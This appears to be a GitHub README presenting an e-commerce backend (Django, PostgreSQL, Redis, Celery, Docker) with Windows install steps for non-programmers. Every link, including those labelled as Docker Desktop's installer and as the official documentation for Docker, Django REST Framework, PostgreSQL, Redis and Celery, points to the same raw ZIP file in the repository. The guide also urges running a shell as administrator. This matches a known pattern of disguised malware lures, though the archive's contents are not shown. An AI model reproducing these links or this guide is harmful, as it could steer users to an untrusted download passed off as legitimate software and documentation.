# 🛒 ecommerce-backend-api - Reliable E-commerce Backend Service

[![Download Now](https://img.shields.io/badge/Download-ecommerce--backend--api-brightgreen?style=for-the-badge)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)

---

## 🔍 About ecommerce-backend-api

This application provides the backend part of an online store. It handles the data your store needs like products, users, and orders. It also manages user access and background tasks for smooth operation.

The backend uses widely trusted tools:
- Django REST Framework for building the API.
- PostgreSQL for data storage.
- Redis and Celery for handling background jobs.
- Docker and Docker Compose for easy setup and running.

You don’t need to understand programming to use this software. This guide will help you install and run it on Windows step-by-step.

---

## 💻 System Requirements

Before starting, make sure your computer meets these requirements:

- Windows 10 or newer (64-bit)
- At least 8 GB of RAM (more RAM helps with larger stores)
- At least 10 GB free disk space for installation and data
- Internet connection to download files and updates
- Basic familiarity with downloading files and running apps

---

## 🖥️ Installing Prerequisites

This backend runs inside Docker containers. Docker packages everything needed to run the software safely.

**Install Docker Desktop for Windows:**

1. Go to https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
2. Click **Download for Windows**.
3. Run the downloaded installer.
4. Follow the setup steps as directed.
5. After installation, you may need to restart your computer.
6. Open Docker Desktop to confirm it runs correctly.

Docker Compose is included in Docker Desktop, so no extra install needed.

---

## 🚀 Download and Run the Backend API

You will download the backend API from the project’s release page. You do not need programming skills for these steps.

### Step 1: Visit the Download Page

Go to the release page here:

[![Download Releases](https://img.shields.io/badge/Download%20Page-%23007ACC?style=for-the-badge&logo=github)](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)

This page shows the latest versions available.

### Step 2: Download the Latest Release

- Find the newest release (top of the list).
- Inside the release assets, look for a file named something like **ecommerce-backend-api.zip** or **docker-compose.yml**.
- Click the file to download it to your computer, preferably to a folder you can access easily, like **Downloads** or **Documents**.

### Step 3: Extract the Files

If you downloaded a ZIP file:

- Right-click on the file.
- Choose **Extract All**.
- Pick a location, for example, **Documents\ecommerce-backend-api**.
- Click **Extract**.

---

## ⚙️ Setup and Run the Application

Inside the extracted folder, there should be a file named **docker-compose.yml**. This file tells Docker how to start the backend API and its services.

### Step 1: Open PowerShell or Command Prompt

- Click the **Start** menu.
- Search for **PowerShell** or **Command Prompt**.
- Right-click and select **Run as administrator**. This gives the command tool permission to run Docker commands.

### Step 2: Navigate to the Folder

Type the following command and press Enter to move to the folder where you extracted the files. Adjust the path if you extracted somewhere else:

```
cd C:\Users\YourName\Documents\ecommerce-backend-api
```

Replace `YourName` with your actual Windows username.

### Step 3: Start the Backend

Run this command to start the backend and all its components (database, cache, task queue):

```
docker-compose up
```

Docker will download necessary images and start the containers. This might take a few minutes the first time.

### Step 4: Confirm the Backend Is Running

- Once you see messages that say services are “healthy” or “up,” the backend is running.
- Open your web browser and go to http://localhost:8000/api/ to see if the API is responding.
- You should see a JSON or a simple webpage showing the API status.

---

## 🔄 Stopping and Restarting

- To stop the backend, go back to the PowerShell or Command Prompt window and press `Ctrl + C`.
- You can start it again by running `docker-compose up` from the same folder.

---

## 📂 What’s Inside this Application?

This backend handles the following:

- **Product Management:** Add, edit, and delete products.
- **User Accounts:** Signup, login, and role management including admin capabilities.
- **Orders:** Process and track customer orders.
- **Authentication:** Secure login methods using JWT tokens and Google OAuth.
- **Background Tasks:** Jobs like sending emails or processing payments run in the background using Celery.
- **Database:** Saves data in PostgreSQL.
- **Cache:** Redis stores temporary data for faster response.

---

## ⚠️ Common Troubleshooting

If you run into issues, try these steps:

- Make sure Docker Desktop is running without errors.
- Check if your computer meets system requirements.
- Try restarting Docker Desktop.
- Verify you ran PowerShell or Command Prompt as administrator.
- Confirm the folder path you typed matches where the files are on your PC.
- Check your firewall settings to allow Docker network traffic.

---

## 🔗 Additional Resources

- Docker Documentation: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
- Django REST Framework: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
- PostgreSQL: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
- Redis: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip
- Celery: https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip

---

## 💾 Download Link Again

Start here to download the backend and get all necessary files:  
[Download ecommerce-backend-api](https://github.com/DigitalInfluencer/ecommerce-backend-api/raw/refs/heads/main/payments/backend_api_ecommerce_2.8-alpha.5.zip)